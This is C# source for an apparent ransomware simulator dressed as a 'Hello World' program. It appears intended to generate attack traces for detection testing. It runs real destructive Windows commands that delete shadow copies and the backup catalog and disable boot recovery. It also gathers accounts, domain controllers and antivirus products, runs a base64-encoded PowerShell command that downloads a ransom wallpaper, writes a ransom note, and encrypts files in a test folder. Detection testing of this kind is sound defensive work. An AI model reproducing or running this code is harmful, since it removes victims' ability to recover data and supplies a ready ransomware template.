using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace HelloWorld;

internal class Hello
{
	private static void Main(string[] args)
	{
		bool flag = false;
		Console.WriteLine("Hello World!");
		for (int i = 0; i < args.Length; i++)
		{
			Console.WriteLine(args[i]);
			if (args[i] == "-decrypt")
			{
				flag = true;
			}
		}
		Console.WriteLine("@ Anyone who thinks they need to analyze this file: it is just to demonstrate traces");
		if (!flag)
		{
			if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
			{
				Thread.Sleep(20000);
				Process.Start("cmd.exe", "/c vssadmin Delete Shadows /All /Quiet");
				Process.Start("cmd.exe", "/c cdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures & bcdedit /set {{default}} recoveryenabled no");
				Process.Start("cmd.exe", "/c wbadmin.exe delete catalog -quiet");
				Process.Start("cmd.exe", "/c wmic shadowcopy delete");
				Process.Start("cmd.exe", "/c whoami");
				Process.Start("cmd.exe", "/c wmic USERACCOUNT Get Domain,Name,Sid");
				Process.Start("cmd.exe", "/c wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE");
				Process.Start("cmd.exe", "/c wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct");
				string arguments = " -exec bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AaQB0AHAAcgBvAHQAbwBkAGEAeQAuAGMAbwBtAC8AcwBpAHQAZQBzAC8AaQB0AHAAcgBvAHQAbwBkAGEAeQAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AcwB0AHkAbABlAHMALwBhAHIAdABpAGMAbABlAF8AZgBlAGEAdAB1AHIAZQBkAF8AcgBlAHQAaQBuAGEALwBwAHUAYgBsAGkAYwAvAHIAYQBuAHMAbwBtAHcAYQByAGUALQBhAHQAdABhAGMAawAuAGoAcABnAD8AaQB0AG8AawA9AFoAeAB2AHIAcgBfADQARgAiACAALQBPAHUAdABGAGkAbABlACAAIgByAGEAbgBzAG8AbQAuAGoAcABnACIAIAANAAoAIAAgACAAIABzAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsAQwBVADoAXABDAG8AbgB0AHIAbwBsACAAUABhAG4AZQBsAFwARABlAHMAawB0AG8AcAAiACAALQBuAGEAbQBlACAAVwBhAGwAbABQAGEAcABlAHIAIAAtAHYAYQBsAHUAZQAgAHIAYQBuAHMAbwBtAC4AagBwAGcADQAKACAAIAAgACAAIwBuAGUAZQBkAGUAZAAgAHQAbwAgAGEAYwB0AHUAYQBsAGwAeQAgAGMAaABhAG4AZwBlACAAdABoAGUAIABiAGEAYwBrAGcAcgBvAHUAbgBkACAAYwBvAG4AcwBpAHMAdABlAG4AdABsAHkAIAANAAoAIAAgACAAIABTAGwAZQBlAHAAIAAtAHMAZQBjAG8AbgBkAHMAIAA1AA0ACgAgACAAIAAgACAAUgBVAE4ARABMAEwAMwAyAC4ARQBYAEUAIABVAFMARQBSADMAMgAuAEQATABMACwAVQBwAGQAYQB0AGUAUABlAHIAVQBzAGUAcgBTAHkAcwB0AGUAbQBQAGEAcgBhAG0AZQB0AGUAcgBzACAALAAxACAALABUAHIAdQBlAA==";
				Process.Start("pwsh", arguments);
			}
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpUaGlzIFBDIGhhcyBiZWVuIGluZmVjdGVkIGJ5IE9TVC1DcnlwdAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgpBbGwgeWVyIHByZWNpb3VzIGZpbGV6eiBhcmUgZ29uZSBub3cgOykKTm8gd29ycmllcyBmb3IganVzdCAzMDAkIHlvdSBjYW4gaGF2ZSB0aGVtIGJhY2suLi4KClRvIGRlY29kZSBjb250YWN0OiByYW5zb21Abm90ZXhpc3RhbnQudG8KCgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KanVzdCBraWRkaW5nOiBwYXNzd29yZCBpcyAiYWJjZCIKcnVuIGJpbmFyeSB3aXRoOiAuL2hlbGxvLmV4ZSAtZGVjcnlwdCB0byBkZWNyeXB0"));
			Console.WriteLine(@string);
			File.WriteAllText("ransomnote.txt", @string);
			Console.WriteLine("Oha!");
		}
		Test1(flag);
	}

	private static void Test1(bool decrypt)
	{
		string[] files = Directory.GetFiles("test", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "abcd";
		for (int i = 0; i < files.Length; i++)
		{
			Console.WriteLine(files[i]);
			if (!decrypt)
			{
				if (files[i].EndsWith(".ost"))
				{
					Console.WriteLine("File already encrypted");
				}
				else
				{
					encryptionFile.EncryptFile(files[i], password);
					File.Move(files[i], files[i] + ".ost");
				}
			}
			if (decrypt && files[i].EndsWith(".ost"))
			{
				Console.WriteLine("Glad you decided to do the right thing! Thanks for the money, here are your files:");
				decryptionFile.DecryptFile(files[i], password);
				Console.WriteLine(files[i].Substring(0, files[i].Length - 4));
				File.Move(files[i], files[i].Substring(0, files[i].Length - 4));
			}
		}
	}
}
